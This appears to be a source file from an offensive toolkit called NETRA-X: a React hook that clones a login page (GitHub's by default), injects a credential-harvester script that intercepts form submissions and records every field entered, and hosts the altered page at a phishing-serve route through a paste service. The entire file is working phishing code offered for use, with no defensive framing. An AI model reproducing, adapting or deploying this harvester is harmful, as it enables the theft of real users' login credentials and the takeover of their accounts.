
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { useToast } from '@/hooks/use-toast';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { hostOnPasteRs } from '@/actions/paste-action';

const clonerSchema = z.object({
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
  urlToClone: z.string().optional(),
  htmlContent: z.string().optional(),
}).refine(data => data.urlToClone || data.htmlContent, {
    message: 'Either a URL or HTML content is required.',
    path: ['urlToClone'],
});

const getHarvesterScript = (redirectUrl: string) => `
<script>
    function captureAndRedirect(form) {
        try {
            const formData = new FormData(form);
            const credentials = {};
            let capturedData = false;
            
            for (let [key, value] of formData.entries()) {
                if (typeof value === 'string' && value.length > 0) {
                    credentials[key] = value;
                    capturedData = true;
                }
            }
            
            if (capturedData) {
                const entry = {
                    ...credentials,
                    source: window.location.href,
                    timestamp: new Date().toISOString()
                };
                const storageKey = 'netra-captured-credentials';
                try {
                    const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                    const updatedData = [...existingData, entry];
                    localStorage.setItem(storageKey, JSON.stringify(updatedData));
                    
                    window.dispatchEvent(new StorageEvent('storage', {
                        key: storageKey,
                        newValue: JSON.stringify(updatedData)
                    }));

                } catch(e) {
                    console.error('NETRA-X Harvester: Could not save to localStorage.', e);
                }
            }
        } catch (e) {
            console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 150);
        }
    }

    document.addEventListener('submit', function(e) {
        if (e.target && e.target.tagName === 'FORM') {
            e.preventDefault();
            e.stopPropagation();
            captureAndRedirect(e.target);
        }
    }, true);
</script>
`;

export function usePageCloner(onHostPage: (url: string) => void) {
    const { toast } = useToast();
    const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
    const [isProcessing, setIsProcessing] = useState(false);
    const [isHosting, setIsHosting] = useState(false);

    const form = useForm<z.infer<typeof clonerSchema>>({
        resolver: zodResolver(clonerSchema),
        defaultValues: {
            redirectUrl: 'https://github.com/password_reset',
            urlToClone: 'https://github.com/login',
            htmlContent: '',
        },
    });

    const resetState = () => {
        setModifiedHtml(null);
        setIsProcessing(false);
        setIsHosting(false);
    };

    const processAndInject = async (values: z.infer<typeof clonerSchema>) => {
        setIsProcessing(true);
        setModifiedHtml(null);

        try {
            let originalHtml = values.htmlContent;
            let baseHrefUrl = values.urlToClone;

            if (values.urlToClone) {
                toast({ title: "Cloning Page...", description: "Fetching HTML content from the URL." });
                const response = await clonePageFromUrl({ url: values.urlToClone });
                originalHtml = response.htmlContent;
                form.setValue('htmlContent', originalHtml);
            } else if (originalHtml) {
                const actionMatch = originalHtml.match(/action="([^"]+)"/);
                baseHrefUrl = (actionMatch && actionMatch[1].startsWith('http'))
                    ? new URL(actionMatch[1]).origin
                    : new URL(values.redirectUrl).origin;
            }

            if (!originalHtml) throw new Error("No HTML content to process.");

            let html = originalHtml;
            const harvesterScript = getHarvesterScript(values.redirectUrl);
            
            if (baseHrefUrl) {
                html = html.includes('<head>') 
                    ? html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`) 
                    : `<head><base href="${baseHrefUrl}"></head>${html}`;
            }

            html = html.includes('</body>') 
                ? html.replace(/<\\/body>/i, `${harvesterScript}</body>`)
                : html + harvesterScript;

            setModifiedHtml(html);
            toast({ title: "HTML Prepared", description: "Credential harvester has been injected." });

        } catch (e) {
            const error = e instanceof Error ? e.message : "An unknown error occurred";
            toast({ variant: 'destructive', title: "Processing Failed", description: error });
        } finally {
            setIsProcessing(false);
        }
    };

    const hostPage = async () => {
        if (!modifiedHtml) return;
        setIsHosting(true);
        toast({ title: "Hosting Page...", description: "Uploading content to secure host." });

        try {
            const result = await hostOnPasteRs(modifiedHtml);
            if (!result.success || !result.pasteId) {
                throw new Error(result.error || "Failed to get a paste ID from the hosting service.");
            }
            
            const hostedUrl = window.location.origin + "/api/phishing/serve/" + result.pasteId;
            
            onHostPage(hostedUrl);
            
            toast({ title: "Page Hosted Successfully!", description: "Link is ready to be shared." });

        } catch (e) {
            const error = e instanceof Error ? e.message : "An unknown error occurred";
            toast({ variant: 'destructive', title: "Hosting Failed", description: error });
        } finally {
            setIsHosting(false);
        }
    };

    return {
        form,
        modifiedHtml,
        isProcessing,
        isHosting,
        resetState,
        processAndInject,
        hostPage,
    };
}
